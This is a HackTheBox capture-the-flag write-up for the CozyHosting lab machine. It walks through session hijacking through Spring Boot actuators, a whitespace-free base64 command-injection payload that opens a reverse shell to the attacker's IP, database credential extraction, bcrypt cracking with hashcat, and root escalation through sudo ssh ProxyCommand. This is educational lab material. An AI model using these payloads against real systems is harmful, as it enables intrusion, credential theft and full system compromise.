# [CozyHosting](https://app.hackthebox.com/machines/CozyHosting) - 04/09/2023 - HackTheBox write-up

IP:   10.10.11.230
Name: cozyhosting.htb

## User flag

### Discovery

HTTP & SSH server.

### Searching for vulnerability

It's a web app based on SpringBoot framework. With a quick enumeration we can find that we have actually access to the actuators.

In one of them (`/actuator/sessions`) we can find sessions that are actually connected to the app, identified by a name and their session cookies. So, we can use one of these cookies to connect to the app as `kanderson`.

### Exploitation

Then there is form to connect through SSH to another server monitored by the user. We can suppose that the app run a SSH command directly in the backend and it might be some commands injection. Quickly we can find that the hostname isn't injectable but we can see the error output so it confirms the command injection. In the  user field we cannot insert space (error "Username can't contains whitespaces!"), but we can send a payload without spaces like that to obtain a reverse shell :
```bash
echo${IFS}L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0Ljg4LzU2Mzg0IDA%2bJjEK|base64${IFS}-d|bash
# Once decode the base64 payload is a classic reverse shell
/bin/bash -i >& /dev/tcp/10.10.14.88/56384 0>&1
```

It works, we have access to the machine as user `app`. It's a service account for SpringBoot app, we need to do a lateral movement to `josh` to obtain the user flag.

### Searching for vulnerability

In the `/app` directory we have a `.jar`, the compiled version of the web app. There is nothing else, and `app` user have really low privileges, so we can supposed that we will find clues in this archive.

After decompiling it, we can find the file `application.properties`:
```
server.address=127.0.0.1
server.servlet.session.timeout=5m
management.endpoints.web.exposure.include=health,beans,env,sessions,mappings
management.endpoint.sessions.enabled = true
spring.datasource.driver-class-name=org.postgresql.Driver
spring.jpa.database-platform=org.hibernate.dialect.PostgreSQLDialect
spring.jpa.hibernate.ddl-auto=none
spring.jpa.database=POSTGRESQL
spring.datasource.platform=postgres
spring.datasource.url=jdbc:postgresql://localhost:5432/cozyhosting
spring.datasource.username=postgres
spring.datasource.password=Vg&nvzAQ7XxR
```

And here we have creds to connect to the PostgreSQL database.

### Exploitation

I found the `psql` command tricky, but we can connect to the database with this command:
```bash
psql "postgresql://postgres:Vg&nvzAQ7XxR@127.0.0.1/cozyhosting"
```

And then, we can list tables, there are `hosts` and `users` tables. In the second we should find some passwords to reuse somewhere:
```
SELECT * from users;
   name    |                           password                           | role  
-----------+--------------------------------------------------------------+-------
 kanderson | $2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim | User
 admin     | $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm | Admin
```

They are hashed with Bcrypt, it will be slow but we can attempt to crack it with `hashcat`:
```
$ hashcat -a 0 -m 3200 hash.txt /usr/share/john/rockyou.txt
[...]
$2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm:manchesterunited
[...]
```

Fortunately the password was found in the first thousands password cracked in `rockyou.txt` list, and then we can reuse it to connect through SSH as `josh` user and get the flag.

## Root flag

### Searching for elevating privileges

Root flag was very easy, we just need to run `sudo -l`:
```
josh@cozyhosting:~$ sudo -l
User josh may run the following commands on localhost:
    (root) /usr/bin/ssh *
```

### Exploitation

So now, we just need to find a way to execute command directly with ssh as `root`. A great resource is : [https://gtfobins.github.io/](https://gtfobins.github.io/).

We can find the following command, and get the flag:
```bash
josh@cozyhosting:~$ sudo /usr/bin/ssh -o ProxyCommand=';bash 0<&2 1>&2' x
root@cozyhosting:/home/josh# id
uid=0(root) gid=0(root) groups=0(root)
root@cozyhosting:/home/josh# cat /root/root.txt 
[... flag ...]
```
